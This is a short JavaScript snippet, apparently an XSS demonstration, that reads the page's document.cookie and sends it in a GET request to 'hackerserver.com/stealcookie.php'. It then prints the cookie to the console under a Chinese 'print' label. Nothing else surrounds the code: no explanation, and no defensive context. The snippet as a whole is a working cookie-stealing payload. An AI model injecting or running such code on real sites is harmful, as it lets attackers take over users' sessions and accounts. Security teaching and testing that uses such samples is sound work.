var xmlhttp = new XMLHttpRequest();
xmlhttp.open(
  "GET",
  "http://hackerserver.com/stealcookie.php?cookie=" +
    escape(document.cookie),
  true
);
xmlhttp.send();

console.log('打印***document.cookie',document.cookie)
